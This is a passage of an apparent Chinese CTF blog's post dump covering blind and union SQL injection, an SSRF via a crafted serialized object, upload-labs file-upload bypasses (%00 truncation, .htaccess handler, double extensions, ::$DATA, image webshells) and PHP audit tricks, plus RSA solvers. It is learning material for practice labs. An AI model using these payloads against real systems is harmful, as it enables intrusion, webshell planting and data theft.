=\"||/**/(select/**/password/**/from/**/users/**/limit/**/9,1)/**/regexp/**/binary/**/%s/**/#\" % (a + str)# 盲注的查询语句 regexp binary 是区分大小写的正则匹配 data =&#123;\"username\":\"\\\\\",\"password\":payload&#125; print(data) r = requests.post(url,data=data) #访问 if \"success\" in r.text: #print(r.text) password+=chr(j) print(password) a+=str break if \"wrong\" in r.text: breakprint(password) Crypto幼儿园的密码题先转换为十进制后在线分解后直接上脚本 http://www.factordb.com/ 在线分解网址 123456789101112131415161718192021222324252627282930313233import binasciiimport syssys.setrecursionlimit(1000000)def ByteToHex(bins): return ''.join([\"%02X\" % x for x in bins]).strip()def n2s(num): t = hex(num)[2:-1] # python if len(t) % 2 == 1: t = '0' + t \\#print(t) return(binascii.a2b_hex(t).decode('latin1'))def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)def modinv(a, m): g, x, y = egcd(a, m) if g != 1: print('modular inverse does not exist') return 'null' else: return x % mc = 40448992051548719008529549070468060415257485938698092782029814901918646701101p = 328413456989577256301798468872388310877q = 324350545929838254331191385863847627003e = 65537n = p * qd = modinv(e, (p - 1) * (q - 1))m = pow(c, d, n)print (m) 数字转字符的脚本 12345678import binasciidef n2s(num): t = hex(num)[2:-1] # python if len(t) % 2 == 1: t = '0' + t \\#print(t) return(binascii.a2b_hex(t).decode('latin1'))print(n2s(a)) #a为上一个脚本计算出的数字 小学生的密码题初中生的密码题次题与幼儿园的类似，但是由于n过大，试了很多工具都无法分解。 仔细看题会发现这题的条件给的比较多,知道p-q 于是想到了(p+q)^2-(p-q)^2=4pq=4n，可以算出p+q,之后解出p,q 12345678910111213141516171819算p,q的脚本# -*- coding = utf - 8 -*-#@Time : 2020/9/24 21:55#@Author : sunzy#@File : su.pyimport gmpy2n = 848636981711330203910533960833570455347986345690792054016750216327432282027653737545502731789145875082064910377585125307004316982829408169391535303284775605083341204318559328114199464933306718077358184455649201353500348066849356092072732731595459583112558025395897556853371526959018489282157258240657926428930442774978485014507505784476690845099227369478496626645851076679385883251594929952035661085961598388544126711902983065521128172978259778754970695037278639045266353840536697343675638366506183715240679610094431082173271579344392346412454309134164388560354168918421706979410826758333952277436780339926907679282601846125790204266958409253210507301575619878252146515542791259716201124558373197816421305046774535734189567481599690381428371580696486054135486182509762880877363356256116336930055483318415453999460475103494980748558993889459677374574910745242385711928489669790527969454801533682757508950065697410745338257289717598141031203566419840587221470340637486034911686587695890702753064441476917845870069997649577034149354150224132983093069444866234262542625997399303875938451386377357399819123134018307163799151847997740448433278364764592560369020005024859119937315831252233159882960532854116233641920659786799836075681746397p_sub_q = -3052070064538177039316204197190587772604720575847063904632214287646067455053231054471310322671549035272267675314294983896730810628462303176753740499536650509067032550999649642312183001467325569057721784454105443122299599368088210370664912463545058026638059476152117310712548608873763578306375998350729040793659145108802752313856984121444358377361896069243965149432626400631035486457915394853541729904150184876824863707417199152978276518660302136096681722191666079256269268999389217644896376343059852127338281844120448782198891495913902938174313438531667749920307775936355947018946620720978288405012504885451732231636x = (4*n+p_sub_q*p_sub_q)gmpy2.mpz(x)#p_add_q = gmpy2.iroot(x, 2)p_add_q = 58342634998122692674032973234620896020471694068399847453520741898744437026570834277134765347908181270295928479896424327076716339778780713227054670754114006755614107059128760453507315091935855120450792252194791430498450216725579392051311373554303029775579999984765816108626868293630358812164765119470747267373609041885833415440716244492402495944064255436477147868576748300862501670473856373437423326957856588782039066794320093570665076624361151742737113922376038763268964187459938086360191752544167623804772397201519904950840301831333585995087985697059748872751988663760065650743406672809203915981347563824970092886078# print(p_add_q)y=(p_sub_q+p_add_q)z=(p_add_q-p_sub_q)print(y&gt;&gt;1)print(z&gt;&gt;1) 知道p,q后，此题的解法与幼儿园的解法相同 菜鸡只会这么多。。。","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"文件包含","slug":"文件包含","permalink":"https://sunzhengyu99.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"rsa","slug":"rsa","permalink":"https://sunzhengyu99.github.io/tags/rsa/"}]},{"title":"fakebook","date":"2020-09-27T11:17:01.000Z","path":"2020/09/27/fakebook/","text":"攻防世界-fakebook感觉挺有意思的一道题，所以记录一下吧 0x01发现注入点进入网页发现是一个博客页面，先随便注册一个账号登录上去看看，发现了一个貌似可以注入的地方 http://220.249.52.133:44224/view.php?no=1参数no这里应该是一个数字型的注入点，测试一下。 http://220.249.52.133:44224/view.php?no=1 and 1=1显示是正常的，但是 http://220.249.52.133:44224/view.php?no=1 and 1=2网页报错，确定了就是数字型注入 接下来继续注入的常规操作。 http://220.249.52.133:44224/view.php?no=-2 order by 4#时页面显示正常，并提示了网站的根目录 但是当 order by 5 # 时，网页报错，确定是四列。 爆表名 本以为会顺利的爆破出来，但是提示了 hacker ，这里可能存在黑名单检测 试了试双写绕过，发现继续提示hack，再试试用/**/替换空格，这次居然可以了，暂且当它是禁了空格。这里还出现一个提示 Notice: unserialize(): Error at offset 0 of 1 bytes in /var/www/html/view.php on line 31 提示存在反序列化，但是不知道怎么用继续爆表。 ?no=-2/**/union/**/select/**/1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4# ?no=-2 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#39;users&#39;# 爆出一大堆列名。直接读取data的内容 no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS ?no=-2 union/**/select 1,(select data from users),3,4 # 发现内容是注册时信息保存为序列化内容 O:8:”UserInfo”:3:{s:4:”name”;s:5:”sunzy”;s:3:”age”;i:22;s:4:”blog”;s:12:”22.github.io”;} 到这里就不知道怎么办了。。。 0x02审计源码扫描一下目录发现了robots.txt，其中给出来了源码备份文件的路径 源码 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phpclass UserInfo //user信息类&#123; public $name = \"\"; public $age = 0; public $blog = \"\";public function __construct($name, $age, $blog)&#123; $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog;&#125;function get($url) // 处理url&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) &#123; return 404; &#125; curl_close($ch); return $output;&#125;public function getBlogContents ()&#123; return $this-&gt;get($this-&gt;blog);&#125;public function isValidBlog ()&#123; $blog = $this-&gt;blog; return preg_match(\"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i\", $blog);&#125;&#125; 审计源码发现其中get()函数存在SSRF(服务端请求伪造)漏洞。 思路：利用no参数进行注入，在反序列化中构造file文件协议，利用服务端请求伪造漏洞访问服务器上的flag.php文件。 1?no=-2%20union/**/select%201,2,3,'O:8:\"UserInfo\":3:&#123;s:4:\"name\";s:5:\"sunzy\";s:3:\"age\";i:22;s:4:\"blog\";s:29:\"file:///var/www/html/flag.php\";&#125;'%20# 查看源码，解base64。","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"unserailize","slug":"unserailize","permalink":"https://sunzhengyu99.github.io/tags/unserailize/"}]},{"title":"upload-11-21","date":"2020-09-18T13:58:51.000Z","path":"2020/09/18/upload2/","text":"upload-labs 11-21 pass1112345678910111213141516171819$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\",\"ini\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = str_ireplace($deny_ext,\"\", $file_name); $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); 这段代码是将文件名中出现 deny_ext的后缀名替换为空 可以双写绕过，即1.pphphp pass12123456789101112131415161718$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else&#123; $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; &#125;&#125; 本题与之前的题目有所不同，这题的文件的保存路径是可以控制的 这里用的%00截断，原理如下 www.xxx.com/qq.jpg www.xxx.com/qq.php%00.jpg =&gt; www.xxx.com/qq.php其后缀名为.jpg可以绕过检测，但是windows系统处理时不会处理%00之后的内容故保存的文件就是qq.php pass13这题与上题利用的原理相同 但是这里要使用 00的二进制形式 pass14 明确说了上传图片木马 12345678910111213141516171819202122function getReailFileType($filename)&#123; $file = fopen($filename, \"rb\"); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(\"C2chars\", $bin); $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); $fileType = ''; switch($typeCode)&#123; case 255216: $fileType = 'jpg'; break; case 13780: $fileType = 'png'; break; case 7173: $fileType = 'gif'; break; default: $fileType = 'unknown'; &#125; return $fileType;&#125; GIF89a 是GIF图片的文件头 ，是为了绕过gif文件的检查 图片木马的制作 桌面建立一个文本文件将其改为2.jpg，再建立一个改为1.php,其内容为你想添加的一句话木马 copy 2.jpg /b + 1.php /a webshell.jpg 未完待续。。。","tags":[{"name":"双写绕过","slug":"双写绕过","permalink":"https://sunzhengyu99.github.io/tags/%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87/"},{"name":"00截断","slug":"00截断","permalink":"https://sunzhengyu99.github.io/tags/00%E6%88%AA%E6%96%AD/"}]},{"title":"uploads-labs","date":"2020-09-16T13:48:48.000Z","path":"2020/09/16/uploads/","text":"upload-labs 1-10 pass1直接抓包修改文件后缀名为jpg,png,gif即可 pass2查看源码 1if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) 这段代码说明是对文件的MIME类型进行了过滤，直接上传 1.php 抓包后修改文件类型为 &#39;image/jpeg&#39; ,&#39;image/png&#39;,&#39;image/gif&#39;,这三个类型都为图片 知识点补充： MIME类型对大小写不敏感，但是传统写法都是小写。 12345678910111213text/plaintext/htmlimage/jpegimage/pngaudio/mpegaudio/oggaudio/*video/mp4application/*application/jsonapplication/javascriptapplication/ecmascriptapplication/octet-stream 更详细的解释， pass31$deny_ext = array('.asp','.aspx','.php','.jsp'); 只禁止了.asp,.aspx,.php,.jsp后缀文件，可以使用php3,php5,php7,phtml等等后缀名绕过 pass4.htaccess文件的作用 URL重写、自定义错误页面 MIME类型配置 访问权限控制等 主要体现在伪静态的应用 图片防盗链 自定义404错误页面 阻止/允许特定IP/IP段 目录浏览与主页 禁止访问指定文件类型 文件密码保护 123&lt;FilesMatch \"1.jpg\"&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 这几句代码的意思： 通过.htaccess文件调用php解析器去解析一个文件名中只要包含”1.jpg”这个字符串的任意文件， 无论扩展名是什么(没有也行)，都以php的方式来解析 上传完.htaccess文件后直接上传一个 1.jpg即可 pass5123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 本题与第十题完全一样，详细解答见第十题 pass61234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 仔细查看源码会发现少了下面的这段代码 1$file_ext = strtolower($file_ext); //转换为小写 这里就可以大小写绕过。将文件后缀名改为.pHp , .PHP等 pass71234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\"); $file_name = $_FILES['upload_file']['name']; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件不允许上传'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 跟第六关对比发现少了这句话 $file_ext = trim($file_ext); //首尾去空 利用Windows系统的文件名特性。文件名最后增加空格和点，写成1.php .，这个需要用burpsuite抓包修改，上传后保存在Windows系统上的文件名最后的一个.会被去掉，实际上保存的文件名就是1.php pass81234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\"); $file_name = trim($_FILES['upload_file']['name']); $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 这段代码少了这句话，可以与第六关相同的做法 $file_name = deldot($file_name);//删除文件名末尾的点 pass91234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 仔细观察发现少了这段代码 1$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA 采用Windows文件流特性绕过 将文件名改为 1.php::$DATA,但是实质上保存的文件还是1.php pass10123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 这一句代码是用来检测末尾是否是.，可以双写绕过。抓包将文件名改为1.php. . （注意两点之间有空格） 前面去掉.然后检验.不存在，再去空格，留下php.，然后php.不属于$deny_ext数组中存在的，当然就直接提交了。因为windows自动去点，于是php后缀就出来了","tags":[{"name":"MIME","slug":"MIME","permalink":"https://sunzhengyu99.github.io/tags/MIME/"},{"name":"大小写绕过","slug":"大小写绕过","permalink":"https://sunzhengyu99.github.io/tags/%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87/"},{"name":".htaccess","slug":"htaccess","permalink":"https://sunzhengyu99.github.io/tags/htaccess/"},{"name":"windows文件特性","slug":"windows文件特性","permalink":"https://sunzhengyu99.github.io/tags/windows%E6%96%87%E4%BB%B6%E7%89%B9%E6%80%A7/"}]},{"title":"bugku代码审计","date":"2020-09-14T13:01:01.000Z","path":"2020/09/14/decode/","text":"简单的代码审计 extract变量覆盖12345678910111213141516&lt;?php$flag='xxx'; //新建变量extract($_GET); // 变量覆盖if(isset($shiyan)) //判断是否存在&#123;$content=trim(file_get_contents($flag));//把文件读入字符串if($shiyan==$content) //判断两变量是否相等&#123;echo'flag&#123;xxx&#125;';&#125;else&#123;echo'Oh.no';&#125;&#125;?&gt; extract()函数 isset()函数isset() 函数用于检测变量是否已设置并且非 NULL。 如果已经使用 unset() 释放了一个变量之后，再通过 isset() 判断将返回 FALSE。 若使用 isset() 测试一个被设置成 NULL 的变量，将返回 FALSE。 同时要注意的是 null 字符（”\\0”）并不等同于 PHP 的 NULL 常量。 Tips:isset()函数如果一次传入多个参数，只有参数全被设置且非空的情况下才返回TRUE，isset()函数对数组中的元素同样适用。 file_get_contents() 变量覆盖的意思就是让自己上传的变量值覆盖原有的变量值 这里值得注意的是 $shiyan==$content,而content的值来自于函数自己建的$flag变量，所以这题目的变量覆盖实际是覆盖$flag的值，让flag的值和shiyan的值相同 可以用空值的方法使二者想等即 ?shiyan=&amp;flag= strcmp比较字符串http://123.206.87.240:9009/6.php 12345678910&lt;?php$flag = \"flag&#123;xxxxx&#125;\";if (isset($_GET['a'])) &#123;if (strcmp($_GET['a'], $flag) == 0) //如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。//比较两个字符串（区分大小写）die('Flag: '.$flag);elseprint 'No';&#125;?&gt; 题目给的注释很清楚的给出了获得flag的条件。。。 先了解一下 strcmp()的两个参数都必须是字符串类型的，但是如果传递一个非字符穿类型的参数进去，例如数组，则函数就会报错，其返回值就为0。满足 if (strcmp($_GET[&#39;a&#39;], $flag) == 0) 即可获得flag url:http://123.206.87.240:9009/6.php?a[]= urldecode二次编码绕过题目说的很清楚了，二次编码绕过 123456if(eregi(\"hackerDJ\",$_GET[id])) &#123;echo(\"not allowed!\"); PHP 函数 eregi() 语法 int eregi(string pattern, string string, [array regs]); 定义和用法 eregi()函数在一个字符串搜索指定的模式的字符串。搜索不区分大小写。Eregi()可以特别有用的检查有效性字符串,如密码。 可选的输入参数规则包含一个数组的所有匹配表达式,他们被正则表达式的括号分组。 返回值 如果匹配成功返回true,否则,则返回false 这里进行了过滤，传的值不能为hackerDJ 123$_GET[id] = urldecode($_GET[id]);if($_GET[id] == \"hackerDJ\") //要编码的字符串hackerDJ GET会提交时进行一次urlencode urldecode()于urlencode()是一对想反作用的函数，一个解码一个编码。 $_GET[id] = urldecode($_GET[id]) urldecode后的$_GET[id] 复制给自己等于hackerDJ 所以对hackerDJ 进行两次urlencode, 为了绕过过滤；进行一次urldecode后其值和hackerDJ相等，得到flag ?id=%25%36%38%25%36%31%25%36%33%25%36%42%25%36%35%25%37%32%25%34%34%25%34%41 md5()函数之前写过 数组返回NULL绕过123456789101112&lt;?php$flag = \"flag\";if (isset ($_GET['password'])) &#123;if (ereg (\"^[a-zA-Z0-9]+$\", $_GET['password']) === FALSE) //进行过滤，password必须包含字母和数字echo 'You password must be alphanumeric';else if (strpos ($_GET['password'], '--') !== FALSE)die('Flag: ' . $flag);elseecho 'Invalid password';&#125;?&gt; 提示是数组返回NULL 直接尝试提交?password[]=，flag就出来了 了解一下原理， 代码相关知识点链接如下： isset函数：http://php.net/manual/zh/function.isset.php ereg函数：http://www.php.net/manual/zh/function.ereg.php strpos函数：http://www.w3school.com.cn/php/func_string_strpos.asp “[A-Za-z0-9]”方括号表示字符集，[A-Za-z0-9]匹配大小写字母和数字其中一个字符 “^[A-Za-z0-9]$”^表示字符串开始，$表示字符串结束 ，这个匹配只有一个大小写字母和数字字符的字符串 “^[A-Za-z0-9]+$”+号表示重复1到多次，匹配由多个数字大小字母组成的字符串 值得注意的是这两个函数能处理的参数都是string类型 123ereg只能处理字符，r如果数组，则返回的是null，三个等号的时候不会进行类型转换。所以null不等于false。strpos的参数同样不能够是数组，所以返回的依旧是null，null不等于false也是正确。 故?password[]=可以绕过。 但是还有一种为%00截断 ?password=d%00--","tags":[{"name":"变量覆盖","slug":"变量覆盖","permalink":"https://sunzhengyu99.github.io/tags/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"},{"name":"函数漏洞","slug":"函数漏洞","permalink":"https://sunzhengyu99.github.io/tags/%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/"},{"name":"绕过","slug":"绕过","permalink":"https://sunzhengyu99.github.io/tags/%E7%BB%95%E8%BF%87/"}]},{"title":"bugku刷题记录2","date":"2020-09-10T01:05:12.000Z","path":"2020/09/10/bugku1/","text":"bugku刷题记录2 速度要快打开页面查看源码什么也没有 抓包看了看，惊喜的发现了flag字段 一段base64 解码后为NDQyMDIy 提交发现并不对。。。看来另有玄机 多go几次后发现了flag值一直在变，并且有一段提示 &lt;!-- OK ,now you have to post the margin what you find --&gt; 用post方法提交你所发现的内容，只好使用脚本（不会写） 123456789101112import requestsimport base64url=\"http://120.24.86.145:8002/web6/\"r=requests.session()headers=r.get(url).headers#因为flag在消息头里 mid=base64.b64decode(headers['flag'])mid=mid.decode()#为了下一步用split不报错，b64decode后操作的对象是byte类型的字符串，而split函数要用str类型的 flag = base64.b64decode(mid.split(':')[1])#获得flag:后的值data=&#123;'margin':flag&#125;print (r.post(url,data).text)#post方法传上去 cookie欺骗注意观察urlhttp://123.206.87.240:8002/web11/index.php?line=2&amp;filename=a2V5cy50eHQ= line=2&amp;filename=a2V5cy50eHQ= a2V5cy50eHQ= 解密是为key.txt line是行的意思，这里应该是查看key.txt的第line行的代码 这里可以查看index.php源码 index.php的base64值为aW5kZXgucGhw 改变line的值可以一行一行的查看源码，可以使用脚本 1234567import requestsurl1 = \"http://123.206.87.240:8002/web11/index.php?line=\"url2 = \"&amp;filename=aW5kZXgucGhw\"mysession = requests.session()for i in range(0, 40): r = mysession.get(url1+str(i)+url2) print(r.text) 12345678910111213141516171819202122232425262728293031323334353637&lt;?phperror_reporting(0);$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:\"\");$line=isset($_GET['line'])?intval($_GET['line']):0;if($file=='') header(\"location:index.php?line=&amp;filename=a2V5cy50eHQ=\");$file_list = array('0' =&gt;'keys.txt','1' =&gt;'index.php',); if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin')&#123; //看这里$file_list[2]='keys.php';&#125; if(in_array($file, $file_list))&#123;$fa = file($file);echo $fa[$line];&#125;?&gt; if(isset($_COOKIE[&#39;margin&#39;]) &amp;&amp; $_COOKIE[&#39;margin&#39;]==&#39;margin&#39;) 这里可以判断cookie必须满足margin=margin才能访问keys.php never give up查看源码提示了 &lt;!--1p.html--&gt; 